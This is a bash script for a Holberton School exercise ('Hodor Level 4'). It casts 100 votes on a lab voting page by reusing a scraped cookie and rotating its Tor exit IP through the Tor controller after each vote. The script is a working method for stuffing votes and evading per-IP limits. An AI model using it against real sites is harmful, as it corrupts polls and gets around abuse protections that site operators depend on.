#!/bin/bash
# ===---Hodor Level 4----------------------------------------------------------===
#    Solution for the Hodor Project, Level 4 by Julien Barbier.
#    Using Curl through the Tor network. Using socks5 proxy.
#
#    by Alexandro de Oliveira, for Holberton School
# ===--------------------------------------------------------------------------===

# Get the password for the Tor Controller if set:
printf "Controller password => "
read passwd
# Address to verify the current IP(Tor exit).
ip="https://api.ipify.org"
# check="http://clientn.free-hideip.com/map/whatismyip.php" # Alternative IP checker.
URL="http://173.246.108.142/level4.php"
ID="id=23"
COUNT=0
TOTAL=100
# Print the actual IP adress:
curl -s --socks5 127.0.0.1:9050 $ip
COOKIE=$(curl -s -c - -X HEAD --socks5 127.0.0.1:9050 --referer $URL $URL | grep HoldTheDoor | awk '{ print $7 }')

while [ $COUNT -lt $TOTAL ]
do
    DATA="$ID&holdthedoor=submit&key=$COOKIE"
    RESULT=$(curl -s -c - -X POST -d $DATA -b "HoldTheDoor=$COOKIE" --referer $URL --socks5 127.0.0.1:9050 $URL  | grep HoldTheDoor | awk '{ print $7 }')
    if [[ ! -z $RESULT ]]; # If the result is "not empty".
    then
        echo "Vote number: $(($COUNT + 1))"
        ((COUNT++))
    else
        echo $RESULT
    fi
    # Request a new Identity(new Exit IP):
    echo $((echo authenticate \"$passwd\" ; echo signal newnym; echo quit) | nc localhost 9051)
    # echo "Changing identity..."
    # Print the actual IP address:
    # curl -s --socks5 127.0.0.1:9050 $ip
    sleep 10 # 10 seconds of wait is enough to request new identity in Tor network.
             # Not wait work too but chances of get new IP decrease.
done
